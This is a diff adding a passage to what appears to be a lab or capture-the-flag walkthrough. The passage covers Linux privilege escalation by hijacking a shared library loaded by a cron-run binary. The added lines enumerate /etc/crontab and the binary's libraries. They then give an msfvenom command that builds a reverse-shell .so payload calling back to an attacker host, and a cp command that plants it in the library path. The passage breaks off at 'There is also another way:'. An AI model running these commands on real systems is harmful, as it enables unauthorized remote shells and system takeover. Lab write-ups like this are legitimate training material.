@@ -44,3 +44,29 @@ That's for this module.so attack.
 It should look like this:
 <img width="1746" height="843" alt="image" src="https://github.com/user-attachments/assets/6dca2a4d-1782-49bb-9ed3-4ac747c8177e" />
 
+
+
+
+
+A Cron Job could also take place, 
+
+```
+cat /etc/crontab
+ldd /usr/bin/log-sweeper
+```
+****<img width="855" height="395" alt="image" src="https://github.com/user-attachments/assets/f4801d3c-786e-4125-a78e-9720eef06c79" />
+
+
+Make an malious file:
+
+
+```
+msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=kali LPORT=6379
+```
+
+Redo the listener and place the file on ftp server:
+same way as before, then log in with shell with telnet and place the file at this path:
+```
+cp /var/ftp/pub/utils.so /usr/local/lib/dev/utils.so
+```
+There is also another way:
